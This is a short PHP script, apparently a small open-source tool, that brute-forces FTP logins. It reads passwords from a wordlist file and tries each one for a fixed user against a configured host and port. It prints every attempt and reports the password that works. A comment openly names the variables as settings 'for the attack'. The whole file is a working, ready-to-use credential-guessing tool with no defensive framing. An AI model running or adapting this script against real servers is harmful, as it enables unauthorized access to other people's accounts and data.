<?php

/*
    Copyright (C) 2015  Matheus Fidelis
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 */

function ftpbruter() {
  
    #DEFINA AQUI AS VARIÁVEIS PARA O ATAQUE
    $user = 'ftptest';
    $host = '192.168.0.102';
    $passlist = file_get_contents('passtest.txt');
    $port = 21;
    $timeout = 50;
    
    $passes = explode("\n", $passlist);
    $i = 1;
    foreach ($passes as $pass) {
        error_reporting(0);
        echo "[*] Testando " . $user . " && " . $pass . "\n";
        $con = ftp_connect($host, $port, $timeout);
        $login = ftp_login($con, $user, $pass);

        if (!$login) {
            ftp_close($con);
            $i++;

        } else {
            echo "Password encontrado\n";
            echo "Efetuadas " . $i . " tentativas\n";
            echo "User: " . $user . " Password: " . $pass . "\n";
            break;
        }
    }
}

ftpbruter(); 